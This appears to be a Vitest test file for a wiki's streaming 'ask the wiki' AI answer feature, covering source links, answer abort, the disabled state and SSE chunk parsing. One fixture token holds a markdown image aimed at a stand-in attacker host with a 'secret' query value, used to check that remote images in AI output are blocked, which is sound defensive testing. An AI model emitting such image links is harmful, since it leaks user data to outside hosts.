import { screen, waitFor } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { afterEach, describe, expect, it, vi } from "vitest";
import { mockApi, renderAt, sessionFixture } from "../../test-utils";
import { createSseParser, type AskEvent } from "./api";

afterEach(() => {
  vi.unstubAllGlobals();
});

const enabled = () =>
  Response.json({ enabled: true, daily_token_quota: 100000, tokens_used_today: 0 });

function sse(events: [string, unknown][]): string {
  return events.map(([name, data]) => `event: ${name}\ndata: ${JSON.stringify(data)}\n\n`).join("");
}

function streamed(body: string): Response {
  const bytes = new TextEncoder().encode(body);
  return new Response(
    new ReadableStream({
      start(controller) {
        // Split mid-event: the parser must reassemble blocks across chunks.
        controller.enqueue(bytes.slice(0, 25));
        controller.enqueue(bytes.slice(25));
        controller.close();
      },
    }),
    { headers: { "Content-Type": "text/event-stream" } },
  );
}

describe("ask the wiki", () => {
  it("streams the answer, links its sources and never loads remote images", async () => {
    const api = mockApi({
      "GET /api/v1/auth/session": () => Response.json(sessionFixture()),
      "GET /api/v1/ask/status": enabled,
      "POST /api/v1/ask": () =>
        streamed(
          sse([
            ["sources", [{ id: 1, title: "Rollback", space_key: "ops", slug: "rollback" }]],
            ["token", { text: "Run **rollback** [1]. " }],
            ["token", { text: "![leak](https://evil.example.com/x.png?d=secret)" }],
            ["done", { prompt_tokens: 10, completion_tokens: 5 }],
          ]),
        ),
    });
    renderAt("/ask");
    await userEvent.type(await screen.findByLabelText("Your question"), "How do we roll back?");
    await userEvent.click(screen.getByRole("button", { name: "Ask" }));

    expect(await screen.findByRole("link", { name: "Rollback" })).toHaveProperty(
      "pathname",
      "/spaces/ops/pages/rollback",
    );
    expect((await screen.findByText("rollback")).tagName).toBe("STRONG");
    const image = document.querySelector(".wiki-content img");
    expect(image?.getAttribute("src")).toBeNull();
    expect(image?.getAttribute("data-blocked")).toBe("remote");

    const request = api.calls.find((call) => call.method === "POST");
    expect(JSON.parse(request?.init?.body as string)).toEqual({
      question: "How do we roll back?",
      history: [],
    });
  });

  it("stops a running answer by aborting the request", async () => {
    let signal: AbortSignal | null = null;
    mockApi({
      "GET /api/v1/auth/session": () => Response.json(sessionFixture()),
      "GET /api/v1/ask/status": enabled,
      "POST /api/v1/ask": (init) =>
        new Promise<Response>((_, reject) => {
          signal = init?.signal ?? null;
          signal?.addEventListener("abort", () => {
            reject(new DOMException("Aborted", "AbortError"));
          });
        }),
    });
    renderAt("/ask");
    await userEvent.type(await screen.findByLabelText("Your question"), "Long question");
    await userEvent.click(screen.getByRole("button", { name: "Ask" }));
    await userEvent.click(await screen.findByRole("button", { name: "Stop" }));
    await waitFor(() => {
      expect(signal?.aborted).toBe(true);
    });
    expect(await screen.findByText("Stopped.")).toBeDefined();
  });

  it("explains when the feature is not enabled", async () => {
    mockApi({
      "GET /api/v1/auth/session": () => Response.json(sessionFixture()),
      "GET /api/v1/ask/status": () =>
        Response.json({ enabled: false, daily_token_quota: 0, tokens_used_today: 0 }),
    });
    renderAt("/ask");
    expect(await screen.findByText("Ask the wiki is not enabled")).toBeDefined();
  });

  it("parses events split across chunks", () => {
    const seen: AskEvent[] = [];
    const parse = createSseParser((event) => seen.push(event));
    parse('event: token\ndata: {"te');
    parse('xt":"a"}\n\nevent: done\ndata: {"prompt_tokens":1,"completion_tokens":1}\n\n');
    expect(seen.map((event) => event.event)).toEqual(["token", "done"]);
  });
});
